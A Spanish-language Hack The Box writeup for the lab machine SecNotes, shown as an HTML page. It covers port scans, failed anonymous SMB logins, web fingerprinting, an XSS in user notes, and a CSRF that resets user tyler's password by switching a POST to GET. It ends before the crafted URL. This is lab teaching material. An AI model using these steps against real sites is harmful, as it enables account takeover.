<!doctype html>
<html lang="es">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/pointed.png" />

<title>Hack The Box: SecNotes Writeup | Medium&nbsp;|&nbsp;Bajo el Teclado</title>
<meta
  name="title"
  content="Hack The Box: SecNotes Writeup | Medium"
/>
<meta
  name="description"
  content="Hack The Box: SecNotes Writeup
Welcome to my detailed writeup of the medium difficulty machine &ldquo;SecNotes&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration






1$ rustscan -a 10.129.18.0 --ulimit 5000 -g
210.129.18.0 -&gt; [80,445,8808]






 1$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts
 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:10 CEST
 3Nmap scan report for 10.129.18.0
 4Host is up (0.037s latency).
 5
 6PORT     STATE SERVICE      VERSION
 780/tcp   open  http         Microsoft IIS httpd 10.0
 8| http-methods: 
 9|_  Potentially risky methods: TRACE
10|_http-server-header: Microsoft-IIS/10.0
11| http-title: Secure Notes - Login
12|_Requested resource was login.php
13445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
148808/tcp open  http         Microsoft IIS httpd 10.0
15|_http-server-header: Microsoft-IIS/10.0
16|_http-title: IIS Windows
17| http-methods: 
18|_  Potentially risky methods: TRACE
19Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
20
21Host script results:
22| smb-security-mode: 
23|   account_used: &lt;blank&gt;
24|   authentication_level: user
25|   challenge_response: supported
26|_  message_signing: disabled (dangerous, but default)
27| smb-os-discovery: 
28|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
29|   OS CPE: cpe:/o:microsoft:windows_10::-
30|   Computer name: SECNOTES
31|   NetBIOS computer name: SECNOTES\x00
32|   Workgroup: HTB\x00
33|_  System time: 2024-08-14T04:11:27-07:00
34|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s
35| smb2-time: 
36|   date: 2024-08-14T11:11:25
37|_  start_date: N/A
38| smb2-security-mode: 
39|   3:1:1: 
40|_    Message signing enabled but not required
41
42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
43Nmap done: 1 IP address (1 host up) scanned in 52.61 seconds
UDP Enumeration






1$ sudo nmap --top-ports 1500 10.129.18.0 -sU --min-rate 5000 -n -Pn -oN allPorts.UDP
2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:13 CEST
3Nmap scan report for 10.129.18.0
4Host is up.
5All 1500 scanned ports on 10.129.18.0 are in ignored states.
6Not shown: 1500 open|filtered udp ports (no-response)
7
8Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds
HTTP Enumeration
Hay pocos vectores de ataque y como por SMB no consigo nada.."
/>
<meta
  name="keywords"
  content="HackTheBox,SecNotes,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Linux,XSS,Reflected XSS,Stored XSS,HTTP Method Confusion,CSRF,Information Leakage,Abusing WSL,Information Leakage,"
/>

  <meta name="author" content="Andrés Del Cerro" />




<meta property="og:url" content="http://localhost:1313/writeups/secnotes---hackthebox/">
  <meta property="og:site_name" content="Bajo el Teclado">
  <meta property="og:title" content="Hack The Box: SecNotes Writeup | Medium">
  <meta property="og:description" content="Hack The Box: SecNotes Writeup Welcome to my detailed writeup of the medium difficulty machine “SecNotes” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.18.0 --ulimit 5000 -g 210.129.18.0 -&gt; [80,445,8808]1$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:10 CEST 3Nmap scan report for 10.129.18.0 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8| http-methods: 9|_ Potentially risky methods: TRACE 10|_http-server-header: Microsoft-IIS/10.0 11| http-title: Secure Notes - Login 12|_Requested resource was login.php 13445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 148808/tcp open http Microsoft IIS httpd 10.0 15|_http-server-header: Microsoft-IIS/10.0 16|_http-title: IIS Windows 17| http-methods: 18|_ Potentially risky methods: TRACE 19Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows 20 21Host script results: 22| smb-security-mode: 23| account_used: &lt;blank&gt; 24| authentication_level: user 25| challenge_response: supported 26|_ message_signing: disabled (dangerous, but default) 27| smb-os-discovery: 28| OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) 29| OS CPE: cpe:/o:microsoft:windows_10::- 30| Computer name: SECNOTES 31| NetBIOS computer name: SECNOTES\x00 32| Workgroup: HTB\x00 33|_ System time: 2024-08-14T04:11:27-07:00 34|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s 35| smb2-time: 36| date: 2024-08-14T11:11:25 37|_ start_date: N/A 38| smb2-security-mode: 39| 3:1:1: 40|_ Message signing enabled but not required 41 42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 43Nmap done: 1 IP address (1 host up) scanned in 52.61 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 10.129.18.0 -sU --min-rate 5000 -n -Pn -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:13 CEST 3Nmap scan report for 10.129.18.0 4Host is up. 5All 1500 scanned ports on 10.129.18.0 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.39 secondsHTTP Enumeration Hay pocos vectores de ataque y como por SMB no consigo nada..">
  <meta property="og:locale" content="es">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2024-08-14T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-08-14T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="SecNotes">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Cybersecurity">
    <meta property="article:tag" content="Penetration Testing">
    <meta property="article:tag" content="CTF">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Hack The Box: SecNotes Writeup | Medium">
  <meta name="twitter:description" content="Hack The Box: SecNotes Writeup Welcome to my detailed writeup of the medium difficulty machine “SecNotes” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.18.0 --ulimit 5000 -g 210.129.18.0 -&gt; [80,445,8808]1$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:10 CEST 3Nmap scan report for 10.129.18.0 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8| http-methods: 9|_ Potentially risky methods: TRACE 10|_http-server-header: Microsoft-IIS/10.0 11| http-title: Secure Notes - Login 12|_Requested resource was login.php 13445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 148808/tcp open http Microsoft IIS httpd 10.0 15|_http-server-header: Microsoft-IIS/10.0 16|_http-title: IIS Windows 17| http-methods: 18|_ Potentially risky methods: TRACE 19Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows 20 21Host script results: 22| smb-security-mode: 23| account_used: &lt;blank&gt; 24| authentication_level: user 25| challenge_response: supported 26|_ message_signing: disabled (dangerous, but default) 27| smb-os-discovery: 28| OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) 29| OS CPE: cpe:/o:microsoft:windows_10::- 30| Computer name: SECNOTES 31| NetBIOS computer name: SECNOTES\x00 32| Workgroup: HTB\x00 33|_ System time: 2024-08-14T04:11:27-07:00 34|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s 35| smb2-time: 36| date: 2024-08-14T11:11:25 37|_ start_date: N/A 38| smb2-security-mode: 39| 3:1:1: 40|_ Message signing enabled but not required 41 42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 43Nmap done: 1 IP address (1 host up) scanned in 52.61 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 10.129.18.0 -sU --min-rate 5000 -n -Pn -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:13 CEST 3Nmap scan report for 10.129.18.0 4Host is up. 5All 1500 scanned ports on 10.129.18.0 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.39 secondsHTTP Enumeration Hay pocos vectores de ataque y como por SMB no consigo nada..">





  <meta itemprop="name" content="Hack The Box: SecNotes Writeup | Medium">
  <meta itemprop="description" content="Hack The Box: SecNotes Writeup Welcome to my detailed writeup of the medium difficulty machine “SecNotes” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
TCP Enumeration 1$ rustscan -a 10.129.18.0 --ulimit 5000 -g 210.129.18.0 -&gt; [80,445,8808]1$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:10 CEST 3Nmap scan report for 10.129.18.0 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 780/tcp open http Microsoft IIS httpd 10.0 8| http-methods: 9|_ Potentially risky methods: TRACE 10|_http-server-header: Microsoft-IIS/10.0 11| http-title: Secure Notes - Login 12|_Requested resource was login.php 13445/tcp open microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB) 148808/tcp open http Microsoft IIS httpd 10.0 15|_http-server-header: Microsoft-IIS/10.0 16|_http-title: IIS Windows 17| http-methods: 18|_ Potentially risky methods: TRACE 19Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows 20 21Host script results: 22| smb-security-mode: 23| account_used: &lt;blank&gt; 24| authentication_level: user 25| challenge_response: supported 26|_ message_signing: disabled (dangerous, but default) 27| smb-os-discovery: 28| OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3) 29| OS CPE: cpe:/o:microsoft:windows_10::- 30| Computer name: SECNOTES 31| NetBIOS computer name: SECNOTES\x00 32| Workgroup: HTB\x00 33|_ System time: 2024-08-14T04:11:27-07:00 34|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s 35| smb2-time: 36| date: 2024-08-14T11:11:25 37|_ start_date: N/A 38| smb2-security-mode: 39| 3:1:1: 40|_ Message signing enabled but not required 41 42Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 43Nmap done: 1 IP address (1 host up) scanned in 52.61 secondsUDP Enumeration 1$ sudo nmap --top-ports 1500 10.129.18.0 -sU --min-rate 5000 -n -Pn -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:13 CEST 3Nmap scan report for 10.129.18.0 4Host is up. 5All 1500 scanned ports on 10.129.18.0 are in ignored states. 6Not shown: 1500 open|filtered udp ports (no-response) 7 8Nmap done: 1 IP address (1 host up) scanned in 2.39 secondsHTTP Enumeration Hay pocos vectores de ataque y como por SMB no consigo nada..">
  <meta itemprop="datePublished" content="2024-08-14T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-08-14T00:00:00+00:00">
  <meta itemprop="wordCount" content="1376">
  <meta itemprop="keywords" content="HackTheBox,SecNotes,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Linux,XSS,Reflected XSS,Stored XSS,HTTP Method Confusion,CSRF,Abusing WSL,Information Leakage">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-ZHDKLM7DD2');
</script>


  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/about/"
    
    >About me</a
  >

  <a
    href="/writeups/"
    
    >Writeup&#39;s</a
  >


</nav>
<div style="display: flex; justify-content: center; align-items: center">
  <div style="display: flex; width: 20rem; gap: 2rem;">
    <img src="yo.png" alt="">
    <h1>Hack The Box: SecNotes Writeup | Medium</h1>
  </div>
</div>


    </header>
    <main>
      
  
  
  <content>
    <h1 id="hack-the-box-secnotes-writeup">Hack The Box: SecNotes Writeup</h1>
<p>Welcome to my detailed writeup of the medium difficulty machine <strong>&ldquo;SecNotes&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ rustscan -a 10.129.18.0 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.18.0 -&gt; [80,445,8808]</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>$ nmap -p80,445,8808 -sCV 10.129.18.0 -oN allPorts
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:10 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.18.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT     STATE SERVICE      VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>80/tcp   open  http         Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| http-methods: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>| http-title: Secure Notes - Login
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>|_Requested resource was login.php
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>445/tcp  open  microsoft-ds Windows <span style="color:#ff0;font-weight:bold">10</span> Enterprise <span style="color:#ff0;font-weight:bold">17134</span> microsoft-ds (workgroup: HTB)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>8808/tcp open  http         Microsoft IIS httpd 10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>|_http-title: IIS Windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>| http-methods: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>|_  Potentially risky methods: TRACE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>Host script results:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>| smb-security-mode: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>|   account_used: &lt;blank&gt;
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|   authentication_level: user
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|   challenge_response: supported
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>|_  message_signing: disabled (dangerous, but default)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>| smb-os-discovery: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>|   OS: Windows <span style="color:#ff0;font-weight:bold">10</span> Enterprise <span style="color:#ff0;font-weight:bold">17134</span> (Windows <span style="color:#ff0;font-weight:bold">10</span> Enterprise 6.3)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>|   Computer name: SECNOTES
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>|   NetBIOS computer name: SECNOTES<span style="color:#0ff;font-weight:bold">\x</span><span style="color:#ff0;font-weight:bold">00</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>|   Workgroup: HTB<span style="color:#0ff;font-weight:bold">\x</span><span style="color:#ff0;font-weight:bold">00</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>|_  System time: 2024-08-14T04:11:27-07:00
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>|_clock-skew: mean: 20m32s, deviation: 4h02m31s, median: -1h59m29s
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>| smb2-time: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>|   date: 2024-08-14T11:11:25
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>|_  start_date: N/A
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>| smb2-security-mode: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>|   3:1:1: 
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>|_    Message signing enabled but not required
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 52.61 seconds</span></span></code></pre></div>
<h1 id="udp-enumeration">UDP Enumeration</h1>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> 10.129.18.0 -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn -oN allPorts.UDP
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-14 15:13 CEST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.18.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Host is up.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>All <span style="color:#ff0;font-weight:bold">1500</span> scanned ports on 10.129.18.0 are in ignored states.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>Not shown: <span style="color:#ff0;font-weight:bold">1500</span> open|filtered udp ports (no-response)
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 2.39 seconds</span></span></code></pre></div>
<h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Hay pocos vectores de ataque y como por SMB no consigo nada..</p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ smbclient -L <span style="color:#0ff;font-weight:bold">\\</span>10.129.18.0 -U <span style="color:#0ff;font-weight:bold">&#39;&#39;</span> -N
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>session setup failed: NT_STATUS_ACCESS_DENIED</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ smbmap -H 10.129.18.0 -u <span style="color:#0ff;font-weight:bold">&#39;null&#39;</span> -p <span style="color:#0ff;font-weight:bold">&#39;null&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[!] Authentication error on 10.129.18.0</span></span></code></pre></div>
<p>Vamos a empezar con el puerto 80/TCP</p>
<p>Vemos un recurso <code>login.php</code></p>






<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ whatweb http://10.129.18.0
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>http://10.129.18.0 [<span style="color:#ff0;font-weight:bold">302</span> Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.129.18.0], Microsoft-IIS[10.0], PHP[7.2.7], RedirectLocation[login.php], X-Powered-By[PHP/7.2.7]
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>http://10.129.18.0/login.php [<span style="color:#ff0;font-weight:bold">200</span> OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.18.0], Microsoft-IIS[10.0], PHP[7.2.7], PasswordField[password], Title[Secure Notes - Login], X-Powered-By[PHP/7.2.7]</span></span></code></pre></div>
<p>Con la siguiente pinta.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Si nos creamos una cuenta, podemos ver lo siguiente.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>Encontramos un Reflected XSS en las notas ya que este se guarda en las notas del usuario.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>En el campo de contacto podemos enviar un mensaje a <code>tyler</code>.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<p>Si le mandamos una dirección URL, parece que <code>tyler</code> la abre..
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<h2 id="updating-tyler-password--csrf">Updating Tyler password | CSRF</h2>
<p>Comprobando la funcionalidad para cambiar la contraseña, vemos que se envía una solicitud POST a <code>change_pass.php</code>
<img src="images/Screenshot_7.png" alt="Write-up Image"><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
<p>Pero si intentamos cambiar la solicitud a GET..
<img src="images/Screenshot_9.png" alt="Write-up Image">
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p>¡La credencial también se cambia!</p>
<p>A esto se le conoce como HTTP Method Confusion, y esto puede llevar a un CSRF.</p>
<p>Podemos ver que para cambiar la contraseña no hay ningún token CSRF y además si recordamos, <code>tyler</code> abría los links que le adjuntamos en el formulario de contacto&hellip;</p>
<p>Le pasamos esta URL formulada para cambiar la contraseña de <code>tyler</code> a <code>pointedsec</code>&hellip;
